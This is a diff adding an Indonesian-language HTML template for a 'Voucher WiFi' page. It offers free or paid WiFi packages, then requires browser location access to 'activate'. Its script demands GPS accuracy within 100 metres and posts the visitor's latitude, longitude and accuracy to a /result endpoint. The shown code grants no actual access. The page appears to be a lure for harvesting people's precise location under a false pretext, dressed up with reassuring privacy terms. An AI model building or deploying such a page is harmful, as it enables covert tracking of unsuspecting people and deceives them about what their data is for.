@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Voucher WiFi</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='index.css') }}">
+</head>
+<body>
+  <div class="card">
+    <div class="logo">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M5 12.55a11 11 0 0 1 14.08 0"></path>
+        <path d="M1.42 9a16 16 0 0 1 21.16 0"></path>
+        <path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path>
+        <line x1="12" y1="20" x2="12" y2="20"></line>
+      </svg>
+    </div>
+    <h2>Voucher WiFi</h2>
+    
+    <!-- Step indicator -->
+    <div class="steps">
+      <div class="step active" id="step1">
+        <div class="step-number">1</div>
+        <span>Pilih Paket</span>
+      </div>
+      <div class="step" id="step2">
+        <div class="step-number">2</div>
+        <span>Aktivasi</span>
+      </div>
+    </div>
+    
+    <!-- Page 1: Service Selection -->
+    <div class="page active" id="page1">
+      <p class="subtitle">Pilih layanan WiFi sesuai kebutuhan Anda</p>
+      
+      <div class="service-selection">
+        <h3 class="service-title">Paket WiFi</h3>
+        <div class="service-options">
+          <div class="service-option" data-id="basic" onclick="selectService(this, 'basic')">
+            <span class="option-name">Standar</span>
+            <span class="option-speed">Kecepatan: 10 Mbps</span>
+            <span class="option-time">Durasi: 1 jam</span>
+            <span class="option-price">Gratis</span>
+          </div>
+          
+          <div class="service-option" data-id="premium" onclick="selectService(this, 'premium')">
+            <span class="option-name">Premium</span>
+            <span class="option-badge popular">Populer</span>
+            <span class="option-speed">Kecepatan: 25 Mbps</span>
+            <span class="option-time">Durasi: 3 jam</span>
+            <span class="option-price">Rp 5.000</span>
+          </div>
+          
+          <div class="service-option" data-id="unlimited" onclick="selectService(this, 'unlimited')">
+            <span class="option-name">Unlimited</span>
+            <span class="option-speed">Kecepatan: 50 Mbps</span>
+            <span class="option-time">Durasi: 24 jam</span>
+            <span class="option-price">Rp 20.000</span>
+          </div>
+          
+          <div class="service-option" data-id="business" onclick="selectService(this, 'business')">
+            <span class="option-name">Bisnis</span>
+            <span class="option-badge">Baru</span>
+            <span class="option-speed">Kecepatan: 100 Mbps</span>
+            <span class="option-time">Durasi: 72 jam</span>
+            <span class="option-price">Rp 50.000</span>
+          </div>
+        </div>
+      </div>
+      
+      <button class="btn" id="continueBtn" disabled onclick="goToPage2()">
+        <span class="btn-text">Lanjutkan</span>
+      </button>
+    </div>
+    
+    <!-- Page 2: Location Access -->
+    <div class="page" id="page2">
+      <p class="subtitle">Izinkan akses lokasi untuk melanjutkan</p>
+      
+      <button class="btn" id="activateBtn" onclick="getLocation(this)">
+        <span class="btn-text">Izinkan Akses Lokasi</span>
+        <div class="spinner"></div>
+      </button>
+      
+      <div class="error-message" id="errorMsg"></div>
+      
+      <button class="btn" id="backBtn" style="margin-top: 15px; background: #95a5a6;" onclick="goToPage1()">
+        <span class="btn-text">Kembali</span>
+      </button>
+    </div>
+    
+    <div class="footer">
+      Pastikan layanan lokasi diaktifkan di perangkat Anda
+    </div>
+    
+    <div class="copyright">
+      &copy; 2025 <a href="#">Ketentuan Layanan</a> - Semua Hak Dilindungi
+    </div>
+  </div>
+
+  <!-- Modal Terms of Service -->
+  <div id="tosModal" class="modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h3>Syarat dan Ketentuan Layanan</h3>
+        <span class="close-modal">&times;</span>
+      </div>
+      <div class="modal-body">
+        <h4>1. Penggunaan Layanan VoucherWIFIGratis</h4>
+        <p>Dengan menggunakan layanan VoucherWIFIGratis, Anda menyetujui syarat dan ketentuan yang tercantum di sini. Layanan ini menyediakan akses internet nirkabel melalui sistem voucher untuk pengguna di area yang ditentukan.</p>
+        
+        <h4>2. Pengumpulan Data Lokasi</h4>
+        <p>Aplikasi kami memerlukan akses lokasi Anda <strong>hanya</strong> untuk tujuan berikut:</p>
+        <ul>
+          <li>Memastikan Anda berada dalam jangkauan jaringan WiFi kami</li>
+          <li>Memberikan pengalaman koneksi optimal sesuai dengan posisi Anda</li>
+          <li>Mencegah penggunaan voucher di luar area yang diizinkan</li>
+        </ul>
+        <p>Kami <strong>tidak</strong> menyimpan data lokasi Anda secara permanen atau membagikannya kepada pihak ketiga manapun untuk tujuan komersial.</p>
+        
+        <h4>3. Keamanan Data</h4>
+        <p>Semua data lokasi dikirimkan melalui koneksi terenkripsi dan hanya digunakan selama proses aktivasi. Setelah aktivasi selesai, data lokasi tidak akan disimpan di server kami lebih dari yang diperlukan untuk memberikan layanan.</p>
+        
+        <h4>4. Batasan Penggunaan</h4>
+        <p>Pengguna dilarang menggunakan layanan untuk:</p>
+        <ul>
+          <li>Aktivitas ilegal dalam bentuk apapun</li>
+          <li>Mengunduh konten yang dilindungi hak cipta secara ilegal</li>
+          <li>Menyebarkan malware atau konten berbahaya</li>
+          <li>Menggunakan bandwidth secara berlebihan yang dapat mengganggu pengguna lain</li>
+        </ul>
+        
+        <h4>5. Pembatasan Kecepatan dan Durasi</h4>
+        <p>Kecepatan dan durasi yang tercantum pada setiap paket adalah nilai maksimal. Kecepatan aktual dapat bervariasi berdasarkan jumlah pengguna, kondisi jaringan, dan faktor teknis lainnya.</p>
+        
+        <h4>6. Penghentian Layanan</h4>
+        <p>Kami berhak menghentikan layanan tanpa pemberitahuan jika terjadi pelanggaran terhadap syarat dan ketentuan ini.</p>
+        
+        <h4>7. Perubahan Ketentuan</h4>
+        <p>Kami berhak mengubah syarat dan ketentuan ini sewaktu-waktu. Perubahan akan diumumkan melalui situs web kami.</p>
+        
+        <h4>8. Kontak</h4>
+        <p>Jika Anda memiliki pertanyaan tentang syarat layanan ini, silakan hubungi kami di support@voucherwifigratis.com</p>
+      </div>
+      <div class="modal-footer">
+        <button class="btn-modal-ok">Saya Mengerti</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let selectedService = null;
+    
+    function selectService(element, serviceId) {
+      // Jika kotak yang sama diklik (sudah terpilih), batalkan pilihan
+      if (element.classList.contains('selected')) {
+        element.classList.remove('selected');
+        selectedService = null;
+        document.getElementById('continueBtn').disabled = true;
+        return;
+      }
+      
+      // Remove selected class from all options
+      const options = document.querySelectorAll('.service-option');
+      options.forEach(opt => opt.classList.remove('selected'));
+      
+      // Add selected class to clicked option
+      element.classList.add('selected');
+      
+      // Store selected service
+      selectedService = serviceId;
+      
+      // Enable continue button
+      document.getElementById('continueBtn').disabled = false;
+    }
+    
+    function goToPage1() {
+      document.getElementById('page1').classList.add('active');
+      document.getElementById('page2').classList.remove('active');
+      document.getElementById('step1').classList.add('active');
+      document.getElementById('step2').classList.remove('active');
+      document.getElementById('step2').classList.remove('completed');
+    }
+    
+    function goToPage2() {
+      document.getElementById('page1').classList.remove('active');
+      document.getElementById('page2').classList.add('active');
+      document.getElementById('step1').classList.remove('active');
+      document.getElementById('step1').classList.add('completed');
+      document.getElementById('step2').classList.add('active');
+    }
+    
+    function getLocation(button) {
+      const errorBox = document.getElementById("errorMsg");
+      button.disabled = true;
+      button.classList.add("loading");
+      errorBox.textContent = "";
+      errorBox.classList.remove("visible");
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const accuracy = pos.coords.accuracy;
+            
+            // Validasi lokasi
+            if (accuracy > 100) {
+              errorBox.textContent = "Lokasi tidak cukup akurat (akurasi: " + Math.round(accuracy) + "m). Mohon aktifkan GPS dan coba lagi.";
+              errorBox.classList.add("visible");
+              button.disabled = false;
+              button.classList.remove("loading");
+              return;
+            }
+            
+            if (lat < -90 || lat > 90 || lon < -180 || lon > 180) {
+              errorBox.textContent = "Lokasi tidak valid. Mohon coba lagi.";
+              errorBox.classList.add("visible");
+              button.disabled = false;
+              button.classList.remove("loading");
+              return;
+            }
+
+            // Kirim ke server dengan error handling
+            fetch("/result", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/x-www-form-urlencoded",
+              },
+              body: `latitude=${lat}&longitude=${lon}&accuracy=${accuracy}&service=${selectedService}`,
+            })
+            .then(response => {
+              if (response.redirected) {
+                window.location.href = response.url;
+              } else if (!response.ok) {
+                throw new Error("Gagal mengirim lokasi");
+              }
+            })
+            .catch(error => {
+              errorBox.textContent = "Gagal mengirim lokasi. Coba lagi ya.";
+              errorBox.classList.add("visible");
+              button.disabled = false;
+              button.classList.remove("loading");
+            });
+          },
+          (err) => {
+            let errorMessage = "Gagal mengambil lokasi. Coba lagi ya.";
+            if (err.code === err.PERMISSION_DENIED) {
+              errorMessage = "Akses lokasi ditolak. Mohon izinkan akses lokasi.";
+            } else if (err.code === err.TIMEOUT) {
+              errorMessage = "Waktu permintaan lokasi habis. Coba lagi ya.";
+            }
+            errorBox.textContent = errorMessage;
+            errorBox.classList.add("visible");
+            button.disabled = false;
+            button.classList.remove("loading");
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          }
+        );
+      } else {
+        errorBox.textContent = "Browser kamu nggak support geolokasi.";
+        errorBox.classList.add("visible");
+        button.disabled = false;
+        button.classList.remove("loading");
+      }
+    }
+    
+    // Modal Terms of Service
+    document.addEventListener('DOMContentLoaded', function() {
+      const tosLink = document.querySelector('.copyright a');
+      const modal = document.getElementById('tosModal');
+      const closeBtn = document.querySelector('.close-modal');
+      const okBtn = document.querySelector('.btn-modal-ok');
+      
+      // Menampilkan modal saat link diklik
+      tosLink.addEventListener('click', function(e) {
+        e.preventDefault();
+        modal.style.display = 'block';
+        document.body.style.overflow = 'hidden'; // Mencegah scrolling pada background
+      });
+      
+      // Menutup modal saat tombol close diklik
+      closeBtn.addEventListener('click', function() {
+        modal.style.display = 'none';
+        document.body.style.overflow = 'auto';
+      });
+      
+      // Menutup modal saat tombol OK diklik
+      okBtn.addEventListener('click', function() {
+        modal.style.display = 'none';
+        document.body.style.overflow = 'auto';
+      });
+      
+      // Menutup modal saat area luar modal diklik
+      window.addEventListener('click', function(e) {
+        if (e.target == modal) {
+          modal.style.display = 'none';
+          document.body.style.overflow = 'auto';
+        }
+      });
+    });
+  </script>
+</body>
+</html>
